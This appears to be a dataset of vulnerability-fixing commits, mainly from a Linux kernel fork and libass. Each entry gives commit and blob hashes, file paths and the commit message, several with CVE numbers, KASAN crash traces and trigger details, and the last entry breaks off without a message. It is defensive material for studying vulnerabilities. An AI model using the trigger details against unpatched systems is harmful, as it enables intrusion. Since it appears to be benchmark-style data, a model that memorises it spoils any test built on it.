usb: gadget: f_fs: Fix use-after-free\n\nWhen using asynchronous read or write operations on the USB endpoints the issuer of the IO request is notified by calling the ki_complete() callback of the submitted kiocb when the URB has been completed.\n\nCalling this ki_complete() callback will free kiocb. Make sure that the structure is no longer accessed beyond that point, otherwise undefined behaviour might occur.\n\nFixes: 2e4c7553cd6f ("usb: gadget: f_fs: add aio support") Cc: <stable@vger.kernel.org> # v3.15+ Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Signed-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>

======================================================================
Commit With Fix: 
    8dfbcc4351a0b6d2f2d77f367552f48ffefafe18
File(s) In Commit: 
    drivers/media/tuners/tuner-xc2028.c
Blob(s) In Commit: 
    082ff5608455c273ea9c53e1824bbb76fad15a0e
Blob(s) Before Fix: 
    4e941f00b6008f286b839d8e2f72c41978cc98e5
    cca508d4aafb1545037b7972d06d01c346efeb77
    d12f5e4ad8bf42e0138de60316f1a16ae419a2b8
Projects:
    0-T-0_ps4-linux
Commit Message for 8dfbcc4351a0b6d2f2d77f367552f48ffefafe18:
[media] xc2028: avoid use after free\n\nIf struct xc2028_config is passed without a firmware name, the following trouble may happen:\n\n[11009.907205] xc2028 5-0061: type set to XCeive xc2028/xc3028 tuner [11009.907491] ================================================================== [11009.907750] BUG: KASAN: use-after-free in strcmp+0x96/0xb0 at addr ffff8803bd78ab40 [11009.907992] Read of size 1 by task modprobe/28992 [11009.907994] ============================================================================= [11009.907997] BUG kmalloc-16 (Tainted: G        W      ): kasan: bad access detected [11009.907999] -----------------------------------------------------------------------------\n\n[11009.908008] INFO: Allocated in xhci_urb_enqueue+0x214/0x14c0 [xhci_hcd] age=0 cpu=3 pid=28992 [11009.908012] 	___slab_alloc+0x581/0x5b0 [11009.908014] 	__slab_alloc+0x51/0x90 [11009.908017] 	__kmalloc+0x27b/0x350 [11009.908022] 	xhci_urb_enqueue+0x214/0x14c0 [xhci_hcd] [11009.908026] 	usb_hcd_submit_urb+0x1e8/0x1c60 [11009.908029] 	usb_submit_urb+0xb0e/0x1200 [11009.908032] 	usb_serial_generic_write_start+0xb6/0x4c0 [11009.908035] 	usb_serial_generic_write+0x92/0xc0 [11009.908039] 	usb_console_write+0x38a/0x560 [11009.908045] 	call_console_drivers.constprop.14+0x1ee/0x2c0 [11009.908051] 	console_unlock+0x40d/0x900 [11009.908056] 	vprintk_emit+0x4b4/0x830 [11009.908061] 	vprintk_default+0x1f/0x30 [11009.908064] 	printk+0x99/0xb5 [11009.908067] 	kasan_report_error+0x10a/0x550 [11009.908070] 	__asan_report_load1_noabort+0x43/0x50 [11009.908074] INFO: Freed in xc2028_set_config+0x90/0x630 [tuner_xc2028] age=1 cpu=3 pid=28992 [11009.908077] 	__slab_free+0x2ec/0x460 [11009.908080] 	kfree+0x266/0x280 [11009.908083] 	xc2028_set_config+0x90/0x630 [tuner_xc2028] [11009.908086] 	xc2028_attach+0x310/0x8a0 [tuner_xc2028] [11009.908090] 	em28xx_attach_xc3028.constprop.7+0x1f9/0x30d [em28xx_dvb] [11009.908094] 	em28xx_dvb_init.part.3+0x8e4/0x5cf4 [em28xx_dvb] [11009.908098] 	em28xx_dvb_init+0x81/0x8a [em28xx_dvb] [11009.908101] 	em28xx_register_extension+0xd9/0x190 [em28xx] [11009.908105] 	em28xx_dvb_register+0x10/0x1000 [em28xx_dvb] [11009.908108] 	do_one_initcall+0x141/0x300 [11009.908111] 	do_init_module+0x1d0/0x5ad [11009.908114] 	load_module+0x6666/0x9ba0 [11009.908117] 	SyS_finit_module+0x108/0x130 [11009.908120] 	entry_SYSCALL_64_fastpath+0x16/0x76 [11009.908123] INFO: Slab 0xffffea000ef5e280 objects=25 used=25 fp=0x          (null) flags=0x2ffff8000004080 [11009.908126] INFO: Object 0xffff8803bd78ab40 @offset=2880 fp=0x0000000000000001\n\n[11009.908130] Bytes b4 ffff8803bd78ab30: 01 00 00 00 2a 07 00 00 9d 28 00 00 01 00 00 00  ....*....(...... [11009.908133] Object ffff8803bd78ab40: 01 00 00 00 00 00 00 00 b0 1d c3 6a 00 88 ff ff  ...........j.... [11009.908137] CPU: 3 PID: 28992 Comm: modprobe Tainted: G    B   W       4.5.0-rc1+ #43 [11009.908140] Hardware name:                  /NUC5i7RYB, BIOS RYBDWi35.86A.0350.2015.0812.1722 08/12/2015 [11009.908142]  ffff8803bd78a000 ffff8802c273f1b8 ffffffff81932007 ffff8803c6407a80 [11009.908148]  ffff8802c273f1e8 ffffffff81556759 ffff8803c6407a80 ffffea000ef5e280 [11009.908153]  ffff8803bd78ab40 dffffc0000000000 ffff8802c273f210 ffffffff8155ccb4 [11009.908158] Call Trace: [11009.908162]  [<ffffffff81932007>] dump_stack+0x4b/0x64 [11009.908165]  [<ffffffff81556759>] print_trailer+0xf9/0x150 [11009.908168]  [<ffffffff8155ccb4>] object_err+0x34/0x40 [11009.908171]  [<ffffffff8155f260>] kasan_report_error+0x230/0x550 [11009.908175]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21/0x290 [11009.908179]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908182]  [<ffffffff8155f5c3>] __asan_report_load1_noabort+0x43/0x50 [11009.908185]  [<ffffffff8155ea00>] ? __asan_register_globals+0x50/0xa0 [11009.908189]  [<ffffffff8194cea6>] ? strcmp+0x96/0xb0 [11009.908192]  [<ffffffff8194cea6>] strcmp+0x96/0xb0 [11009.908196]  [<ffffffffa13ba4ac>] xc2028_set_config+0x15c/0x630 [tuner_xc2028] [11009.908200]  [<ffffffffa13bac90>] xc2028_attach+0x310/0x8a0 [tuner_xc2028] [11009.908203]  [<ffffffff8155ea78>] ? memset+0x28/0x30 [11009.908206]  [<ffffffffa13ba980>] ? xc2028_set_config+0x630/0x630 [tuner_xc2028] [11009.908211]  [<ffffffffa157a59a>] em28xx_attach_xc3028.constprop.7+0x1f9/0x30d [em28xx_dvb] [11009.908215]  [<ffffffffa157aa2a>] ? em28xx_dvb_init.part.3+0x37c/0x5cf4 [em28xx_dvb] [11009.908219]  [<ffffffffa157a3a1>] ? hauppauge_hvr930c_init+0x487/0x487 [em28xx_dvb] [11009.908222]  [<ffffffffa01795ac>] ? lgdt330x_attach+0x1cc/0x370 [lgdt330x] [11009.908226]  [<ffffffffa01793e0>] ? i2c_read_demod_bytes.isra.2+0x210/0x210 [lgdt330x] [11009.908230]  [<ffffffff812e87d0>] ? ref_module.part.15+0x10/0x10 [11009.908233]  [<ffffffff812e56e0>] ? module_assert_mutex_or_preempt+0x80/0x80 [11009.908238]  [<ffffffffa157af92>] em28xx_dvb_init.part.3+0x8e4/0x5cf4 [em28xx_dvb] [11009.908242]  [<ffffffffa157a6ae>] ? em28xx_attach_xc3028.constprop.7+0x30d/0x30d [em28xx_dvb] [11009.908245]  [<ffffffff8195222d>] ? string+0x14d/0x1f0 [11009.908249]  [<ffffffff8195381f>] ? symbol_string+0xff/0x1a0 [11009.908253]  [<ffffffff81953720>] ? uuid_string+0x6f0/0x6f0 [11009.908257]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e/0xa0 [11009.908260]  [<ffffffff8104b02f>] ? print_context_stack+0x7f/0xf0 [11009.908264]  [<ffffffff812e9846>] ? __module_address+0xb6/0x360 [11009.908268]  [<ffffffff8137fdc9>] ? is_ftrace_trampoline+0x99/0xe0 [11009.908271]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e/0xa0 [11009.908275]  [<ffffffff81240a70>] ? debug_check_no_locks_freed+0x290/0x290 [11009.908278]  [<ffffffff8104a24b>] ? dump_trace+0x11b/0x300 [11009.908282]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23/0x190 [em28xx] [11009.908285]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21/0x290 [11009.908289]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16/0x590 [11009.908292]  [<ffffffff812404dd>] ? trace_hardirqs_on+0xd/0x10 [11009.908296]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23/0x190 [em28xx] [11009.908299]  [<ffffffff822dcbb0>] ? mutex_trylock+0x400/0x400 [11009.908302]  [<ffffffff810021a1>] ? do_one_initcall+0x131/0x300 [11009.908306]  [<ffffffff81296dc7>] ? call_rcu_sched+0x17/0x20 [11009.908309]  [<ffffffff8159e708>] ? put_object+0x48/0x70 [11009.908314]  [<ffffffffa1579f11>] em28xx_dvb_init+0x81/0x8a [em28xx_dvb] [11009.908317]  [<ffffffffa13e81f9>] em28xx_register_extension+0xd9/0x190 [em28xx] [11009.908320]  [<ffffffffa0150000>] ? 0xffffffffa0150000 [11009.908324]  [<ffffffffa0150010>] em28xx_dvb_register+0x10/0x1000 [em28xx_dvb] [11009.908327]  [<ffffffff810021b1>] do_one_initcall+0x141/0x300 [11009.908330]  [<ffffffff81002070>] ? try_to_run_init_process+0x40/0x40 [11009.908333]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16/0x590 [11009.908337]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908340]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908343]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908346]  [<ffffffff8155ea37>] ? __asan_register_globals+0x87/0xa0 [11009.908350]  [<ffffffff8144da7b>] do_init_module+0x1d0/0x5ad [11009.908353]  [<ffffffff812f2626>] load_module+0x6666/0x9ba0 [11009.908356]  [<ffffffff812e9c90>] ? symbol_put_addr+0x50/0x50 [11009.908361]  [<ffffffffa1580037>] ? em28xx_dvb_init.part.3+0x5989/0x5cf4 [em28xx_dvb] [11009.908366]  [<ffffffff812ebfc0>] ? module_frob_arch_sections+0x20/0x20 [11009.908369]  [<ffffffff815bc940>] ? open_exec+0x50/0x50 [11009.908374]  [<ffffffff811671bb>] ? ns_capable+0x5b/0xd0 [11009.908377]  [<ffffffff812f5e58>] SyS_finit_module+0x108/0x130 [11009.908379]  [<ffffffff812f5d50>] ? SyS_init_module+0x1f0/0x1f0 [11009.908383]  [<ffffffff81004044>] ? lockdep_sys_exit_thunk+0x12/0x14 [11009.908394]  [<ffffffff822e6936>] entry_SYSCALL_64_fastpath+0x16/0x76 [11009.908396] Memory state around the buggy address: [11009.908398]  ffff8803bd78aa00: 00 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908401]  ffff8803bd78aa80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908403] >ffff8803bd78ab00: fc fc fc fc fc fc fc fc 00 00 fc fc fc fc fc fc [11009.908405]                                            ^ [11009.908407]  ffff8803bd78ab80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908409]  ffff8803bd78ac00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908411] ==================================================================\n\nIn order to avoid it, let's set the cached value of the firmware name to NULL after freeing it. While here, return an error if the memory allocation fails.\n\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

======================================================================
Commit With Fix: 
    8d4a2ec1e0b41b0cf9a0c5cd4511da7f8e4f3de2
File(s) In Commit: 
    lib/assoc_array.c
Blob(s) In Commit: 
    59fd7c0b119cbc3e0b61137732f76cc3759fb7c7
Blob(s) Before Fix: 
    03a77f4740c124484821b0f6567c82c02d45bd5f
    03dd576e67730fb2870c44512f55c1c0c39b77f3
    071a8b115dffd71ab0b043633b49e5fe2a9d46cb
    1b6a44f1ec3e3b10f3b02d19f8ab0ce59453f6d5
    2404d03e251a64ae7634d30c46aa22a08f9b4538
    24d94ffb54c6c6c15d523837b06fc9a2f1c14824
    4e53be8bc590dc2030a930aec5a2cac8c4fa6a30
    5cd093589c5af2241453ceae757c6957cdb33d4c
    6f4bcf5245547187876a498dfe9688b6e207d1d0
    c0b1007011e188836616509deef5876c207d32d4
    c6659cb370331fa8afed30ee366b9b2432b9c6f0
Projects:
    0-T-0_ps4-linux
Commit Message for 8d4a2ec1e0b41b0cf9a0c5cd4511da7f8e4f3de2:
assoc_array: don't call compare_object() on a node\n\nChanges since V1: fixed the description and added KASan warning.\n\nIn assoc_array_insert_into_terminal_node(), we call the compare_object() method on all non-empty slots, even when they're not leaves, passing a pointer to an unexpected structure to compare_object(). Currently it causes an out-of-bound read access in keyring_compare_object detected by KASan (see below). The issue is easily reproduced with keyutils testsuite. Only call compare_object() when the slot is a leave.\n\nKASan warning: ================================================================== BUG: KASAN: slab-out-of-bounds in keyring_compare_object+0x213/0x240 at addr ffff880060a6f838 Read of size 8 by task keyctl/1655 ============================================================================= BUG kmalloc-192 (Not tainted): kasan: bad access detected -----------------------------------------------------------------------------\n\nDisabling lock debugging due to kernel taint INFO: Allocated in assoc_array_insert+0xfd0/0x3a60 age=69 cpu=1 pid=1647 	___slab_alloc+0x563/0x5c0 	__slab_alloc+0x51/0x90 	kmem_cache_alloc_trace+0x263/0x300 	assoc_array_insert+0xfd0/0x3a60 	__key_link_begin+0xfc/0x270 	key_create_or_update+0x459/0xaf0 	SyS_add_key+0x1ba/0x350 	entry_SYSCALL_64_fastpath+0x12/0x76 INFO: Slab 0xffffea0001829b80 objects=16 used=8 fp=0xffff880060a6f550 flags=0x3fff8000004080 INFO: Object 0xffff880060a6f740 @offset=5952 fp=0xffff880060a6e5d1\n\nBytes b4 ffff880060a6f730: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f740: d1 e5 a6 60 00 88 ff ff 0e 00 00 00 00 00 00 00  ...`............ Object ffff880060a6f750: 02 cf 8e 60 00 88 ff ff 02 c0 8e 60 00 88 ff ff  ...`.......`.... Object ffff880060a6f760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f770: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7d0: 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ CPU: 0 PID: 1655 Comm: keyctl Tainted: G    B           4.5.0-rc4-kasan+ #291 Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011  0000000000000000 000000001b2800b4 ffff880060a179e0 ffffffff81b60491  ffff88006c802900 ffff880060a6f740 ffff880060a17a10 ffffffff815e2969  ffff88006c802900 ffffea0001829b80 ffff880060a6f740 ffff880060a6e650 Call Trace:  [<ffffffff81b60491>] dump_stack+0x85/0xc4  [<ffffffff815e2969>] print_trailer+0xf9/0x150  [<ffffffff815e9454>] object_err+0x34/0x40  [<ffffffff815ebe50>] kasan_report_error+0x230/0x550  [<ffffffff819949be>] ? keyring_get_key_chunk+0x13e/0x210  [<ffffffff815ec62d>] __asan_report_load_n_noabort+0x5d/0x70  [<ffffffff81994cc3>] ? keyring_compare_object+0x213/0x240  [<ffffffff81994cc3>] keyring_compare_object+0x213/0x240  [<ffffffff81bc238c>] assoc_array_insert+0x86c/0x3a60  [<ffffffff81bc1b20>] ? assoc_array_cancel_edit+0x70/0x70  [<ffffffff8199797d>] ? __key_link_begin+0x20d/0x270  [<ffffffff8199786c>] __key_link_begin+0xfc/0x270  [<ffffffff81993389>] key_create_or_update+0x459/0xaf0  [<ffffffff8128ce0d>] ? trace_hardirqs_on+0xd/0x10  [<ffffffff81992f30>] ? key_type_lookup+0xc0/0xc0  [<ffffffff8199e19d>] ? lookup_user_key+0x13d/0xcd0  [<ffffffff81534763>] ? memdup_user+0x53/0x80  [<ffffffff819983ea>] SyS_add_key+0x1ba/0x350  [<ffffffff81998230>] ? key_get_type_from_user.constprop.6+0xa0/0xa0  [<ffffffff828bcf4e>] ? retint_user+0x18/0x23  [<ffffffff8128cc7e>] ? trace_hardirqs_on_caller+0x3fe/0x580  [<ffffffff81004017>] ? trace_hardirqs_on_thunk+0x17/0x19  [<ffffffff828bc432>] entry_SYSCALL_64_fastpath+0x12/0x76 Memory state around the buggy address:  ffff880060a6f700: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00  ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc fc >ffff880060a6f800: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc                                         ^  ffff880060a6f880: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc  ffff880060a6f900: fc fc fc fc fc fc 00 00 00 00 00 00 00 00 00 00 ==================================================================\n\nSigned-off-by: Jerome Marchand <jmarchan@redhat.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    50220dead1650609206efe91f0cc116132d59b3f
File(s) In Commit: 
    drivers/hid/hid-core.c
Blob(s) In Commit: 
    3f6ac5f2862d82435669088787a4ad8b08eb36c2
Blob(s) Before Fix: 
    16c2c660ab5a52bb45bdc2c46e16e2764c3b07c0
    3402033fa52a7225c0a91846eba5237af8d08142
    7e89288b15375a2e8016ea6b31f5904e95c32719
    c6f7a694f67a189daaae4be80645fb8773bfd2d5
Projects:
    0-T-0_ps4-linux
Commit Message for 50220dead1650609206efe91f0cc116132d59b3f:
HID: core: prevent out-of-bound readings\n\nPlugging a Logitech DJ receiver with KASAN activated raises a bunch of out-of-bound readings.\n\nThe fields are allocated up to MAX_USAGE, meaning that potentially, we do not have enough fields to fit the incoming values. Add checks and silence KASAN.\n\nSigned-off-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    8148a73c9901a8794a50f950083c00ccf97d43b3
File(s) In Commit: 
    fs/proc/base.c
Blob(s) In Commit: 
    92e37e224cd22d66d0b9675f1790e110d5e7b415
Blob(s) Before Fix: 
    3f3d7aeb071257a15afaa9a65f88642e307f80f3
    4f764c2ac1a53db75c7c116cdb3bd4b45074c647
    76bd956246fa40965d98a7f9361a922cc3014e69
    b1755b23893e5e34513582d51d7a9cf9ed6b7227
    bd3e9e68125b8933b2e32a4fea2e2282397dc1cd
    fcdeb1eb39211974b51565202750643bc8f24bc4
Projects:
    0-T-0_ps4-linux
Commit Message for 8148a73c9901a8794a50f950083c00ccf97d43b3:
proc: prevent accessing /proc/<PID>/environ until it's ready\n\nIf /proc/<PID>/environ gets read before the envp[] array is fully set up in create_{aout,elf,elf_fdpic,flat}_tables(), we might end up trying to read more bytes than are actually written, as env_start will already be set but env_end will still be zero, making the range calculation underflow, allowing to read beyond the end of what has been written.\n\nFix this as it is done for /proc/<PID>/cmdline by testing env_end for zero.  It is, apparently, intentionally set last in create_*_tables().\n\nThis bug was found by the PaX size_overflow plugin that detected the arithmetic underflow of 'this_len = env_end - (env_start + src)' when env_end is still zero.\n\nThe expected consequence is that userland trying to access /proc/<PID>/environ of a not yet fully set up process may get inconsistent data as we're in the middle of copying in the environment variables.\n\nFixes: https://forums.grsecurity.net/viewtopic.php?f=3&t=4363 Fixes: https://bugzilla.kernel.org/show_bug.cgi?id=116461 Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Emese Revfy <re.emese@gmail.com> Cc: Pax Team <pageexec@freemail.hu> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Mateusz Guzik <mguzik@redhat.com> Cc: Alexey Dobriyan <adobriyan@gmail.com> Cc: Cyrill Gorcunov <gorcunov@openvz.org> Cc: Jarod Wilson <jarod@redhat.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    c58d6c93680f28ac58984af61d0a7ebf4319c241
File(s) In Commit: 
    net/netfilter/nfnetlink.c
Blob(s) In Commit: 
    857ae89633aff80cea1c6ac74355e5e183b4d780
Blob(s) Before Fix: 
    046aa13b4fea6a570b990444b7ca4c6419824f8f
    0c0e8ecf02abbb4214b18f00ef798d728234866b
    13c2e17bbe279e6660a0a04fc804a6e1dd0a7707
    2278d9ab723bf1c3a2b199db6fc9519e9c59e1be
    46453ab318db0bf2a4bc957dcad6742ccbcacc92
    572d87dc116ffa838d2f9f8838129156add7284e
    58a09b7c3f6d50b4cf95a4c139d637a225421aae
    62e92af2384a175af68323a3a3cd814e99b95e91
    6ae88ace21cbca106216284d93ac93c29379d984
    77afe913d03db73c65631fba8c42732cb3f33f32
    80f5ecf2c3d7096f579361663da5d2e651eebd3e
    8b117c90ecd765ac1b7242c58f36ef7531a49b6e
    a7ba23353dab938b4048095e50da9eb463dfc477
    c421d94c4652625147ba65aebe4c251561cf37ff
    e6ddde165612d11e77e4c2e66086088eb5fead57
Projects:
    0-T-0_ps4-linux
Commit Message for c58d6c93680f28ac58984af61d0a7ebf4319c241:
netfilter: nfnetlink: correctly validate length of batch messages\n\nIf nlh->nlmsg_len is zero then an infinite loop is triggered because 'skb_pull(skb, msglen) ' pulls zero bytes.\n\nThe calculation in nlmsg_len() underflows if 'nlh->nlmsg_len < NLMSG_HDRLEN' which bypasses the length validation and will later trigger an out-of-bound read.\n\nIf the length validation does fail then the malformed batch message is copied back to userspace. However, we cannot do this because the nlh->nlmsg_len can be invalid. This leads to an out-of-bounds read in netlink_ack:\n\n    [   41.455421] ==================================================================     [   41.456431] BUG: KASAN: slab-out-of-bounds in memcpy+0x1d/0x40 at addr ffff880119e79340     [   41.456431] Read of size 4294967280 by task a.out/987     [   41.456431] =============================================================================     [   41.456431] BUG kmalloc-512 (Not tainted): kasan: bad access detected     [   41.456431] -----------------------------------------------------------------------------     ...     [   41.456431] Bytes b4 ffff880119e79310: 00 00 00 00 d5 03 00 00 b0 fb fe ff 00 00 00 00  ................     [   41.456431] Object ffff880119e79320: 20 00 00 00 10 00 05 00 00 00 00 00 00 00 00 00   ...............     [   41.456431] Object ffff880119e79330: 14 00 0a 00 01 03 fc 40 45 56 11 22 33 10 00 05  .......@EV."3...     [   41.456431] Object ffff880119e79340: f0 ff ff ff 88 99 aa bb 00 14 00 0a 00 06 fe fb  ................                                             ^^ start of batch nlmsg with                                                nlmsg_len=4294967280     ...     [   41.456431] Memory state around the buggy address:     [   41.456431]  ffff880119e79400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     [   41.456431]  ffff880119e79480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     [   41.456431] >ffff880119e79500: 00 00 00 00 fc fc fc fc fc fc fc fc fc fc fc fc     [   41.456431]                                ^     [   41.456431]  ffff880119e79580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc     [   41.456431]  ffff880119e79600: fc fc fc fc fc fc fc fc fc fc fb fb fb fb fb fb     [   41.456431] ==================================================================\n\nFix this with better validation of nlh->nlmsg_len and by setting NFNL_BATCH_FAILURE if any batch message fails length validation.\n\nCAP_NET_ADMIN is required to trigger the bugs.\n\nFixes: 9ea2aa8b7dba ("netfilter: nfnetlink: validate nfnetlink header from batch") Signed-off-by: Phil Turnbull <phil.turnbull@oracle.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    f4f48950788b91c6a30029cc28a240b834713ea7
File(s) In Commit: 
    libass/ass_render.c
Blob(s) In Commit: 
    1d3c0c56b85255b74542a6f8e490bc1dcd54e2ee
Blob(s) Before Fix: 
    8790408d51004f22e30ec1551a648cf6d594d486
Projects:
    0p1pp1_libass
Commit Message for f4f48950788b91c6a30029cc28a240b834713ea7:
Fix line wrapping mode 0/3 bugs\n\nThis fixes two separate bugs:\n\na) Don't move a linebreak into the first symbol. This results in a empty    line at the front, which does not help to equalize line lengths at all.    Instead, merge line with the second one. b) When moving a linebreak into a symbol that already is a break, the    number of lines must be decremented. Otherwise, uninitialized memory    is possibly used for later layout operations.\n\nFound by fuzzer test case id:000085,sig:11,src:003377+003350,op:splice,rep:8.\n\nThis might also affect and hopefully fix libass#229.\n\nv2: change semantics according to review

======================================================================
Commit With Fix: 
    08e754612019ed84d1db0d1fc4f5798248decd75
File(s) In Commit: 
    libass/ass_blur.c
Blob(s) In Commit: 
    109c24d06cb2b8459db1a3a8b0c0a80dbda4adfa
Blob(s) Before Fix: 
    636ab1a854e5c50180536c44467944dc80f1754e
    870992eb022f5c9f8ff5b71471cd8a9f9470ea42
Projects:
    0p1pp1_libass
Commit Message for 08e754612019ed84d1db0d1fc4f5798248decd75:
Fix blur coefficient calculation buffer overflow\n\nFound by fuzzer test case id:000082,sig:11,src:002579,op:havoc,rep:8. Correctness should be checked, but this fixes the overflow for good.

======================================================================
Commit With Fix: 
    aa54e0b59200a994d50a346b5d7ac818ebcf2d4b
File(s) In Commit: 
    libass/ass_shaper.c
Blob(s) In Commit: 
    5f24c5a955fdec1abb5eaeafa7b313f4845d7b77
Blob(s) Before Fix: 
    2707b2362e44d7beae2a196437f983bb4b4c7abe
    31e368217b19f7513a5579e23e1eba630dd32c35
    95222ae449fb87aa2d88fc2c6138a99a71739b85
Projects:
    0p1pp1_libass
Commit Message for aa54e0b59200a994d50a346b5d7ac818ebcf2d4b:
shaper: fix reallocation\n\nUpdate the variable that tracks the allocated size. This potentially improves performance and avoid some side effects, which lead to undefined behavior in some cases.\n\nFixes fuzzer test case id:000051,sig:11,sync:fuzzer3,src:004221.

======================================================================
Commit With Fix: 
    d9092f52d7e61dd1557f2db2400ddb430e85937e
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    cbd7b92585bbbaabad95811f2a139e24283a4c35
Blob(s) Before Fix: 
    0f6294376fbdcaa2863956822583d09108cecada
    106c01557f2b63706eca28e462a3b072b590f0c5
    1505587d06e97826703b21aba540ea8403bd8f2c
    4e95d3eb29557bcb99219fddb7b909e23ff3b090
    a2f24af3c999ca5f14c553bf5e9875725c47668a
    b9b09fec173bf2fedb0b9ee122b3c4668eb6e471
Projects:
    0-T-0_ps4-linux
Commit Message for d9092f52d7e61dd1557f2db2400ddb430e85937e:
kvm: x86: Check memopp before dereference (CVE-2016-8630)\n\nCommit 41061cdb98 ("KVM: emulate: do not initialize memopp") removes a check for non-NULL under incorrect assumptions. An undefined instruction with a ModR/M byte with Mod=0 and R/M-5 (e.g. 0xc7 0x15) will attempt to dereference a null pointer here.\n\nFixes: 41061cdb98a0bec464278b4db8e894a3121671f5 Message-Id: <1477592752-126650-2-git-send-email-osh@google.com> Signed-off-by: Owen Hofmann <osh@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    667121ace9dbafb368618dbabcf07901c962ddac
File(s) In Commit: 
    drivers/firewire/net.c
Blob(s) In Commit: 
    cbaa8d776d83505c1d298b061970b1c44ef10456
Blob(s) Before Fix: 
    309311b1faae18752a9bf24b0d350933aad4627c
Projects:
    0-T-0_ps4-linux
Commit Message for 667121ace9dbafb368618dbabcf07901c962ddac:
firewire: net: guard against rx buffer overflows\n\nThe IP-over-1394 driver firewire-net lacked input validation when handling incoming fragmented datagrams.  A maliciously formed fragment with a respectively large datagram_offset would cause a memcpy past the datagram buffer.\n\nSo, drop any packets carrying a fragment with offset + length larger than datagram_size.\n\nIn addition, ensure that   - GASP header, unfragmented encapsulation header, or fragment     encapsulation header actually exists before we access it,   - the encapsulated datagram or fragment is of nonzero size.\n\nReported-by: Eyal Itkin <eyal.itkin@gmail.com> Reviewed-by: Eyal Itkin <eyal.itkin@gmail.com> Fixes: CVE 2016-8633 Cc: stable@vger.kernel.org Signed-off-by: Stefan Richter <stefanr@s5r6.in-berlin.de>

======================================================================
Commit With Fix: 
    647bf3d8a8e5777319da92af672289b2a6c4dc66
File(s) In Commit: 
    drivers/infiniband/sw/rxe/rxe_mr.c
Blob(s) In Commit: 
    86a6585b847df90f07256dd4027eeab426be7f77
Blob(s) Before Fix: 
    1869152f1d23632a8d94f092a9c25437a8487407
    9b732c5f89e16cdfed1de7053cabb2e0c91a38e1
    d0faca294006f4f53a40ebcf40839f9758b52c09
    f3dab657450495aafb74550931be2d8b36d8af55
Projects:
    0-T-0_ps4-linux
Commit Message for 647bf3d8a8e5777319da92af672289b2a6c4dc66:
IB/rxe: Fix mem_check_range integer overflow\n\nUpdate the range check to avoid integer-overflow in edge case. Resolves CVE 2016-8636.\n\nSigned-off-by: Eyal Itkin <eyal.itkin@gmail.com> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Leon Romanovsky <leonro@mellanox.com> Signed-off-by: Doug Ledford <dledford@redhat.com>

======================================================================
Commit With Fix: 
    0db98910a11c12a454eac4c8e86dc7a7bbc764a4
File(s) In Commit: 
    dracut.sh
Blob(s) In Commit: 
    2d79bbcc1e19ad69f01205767931110918e867c8
Blob(s) Before Fix: 
    36607cfbc0767e10bbbb0f64a5273a8e62fb784b
    40ca08f659f2289a608ac8e333d4cd818f8d7e76
    4590f794ac4098411fe52aea907c5f05e8e42fda
    c1ef4745c6e311d64aae458dd73f9130281a5e90
Projects:
    AdamWill_dracut
Commit Message for 0db98910a11c12a454eac4c8e86dc7a7bbc764a4:
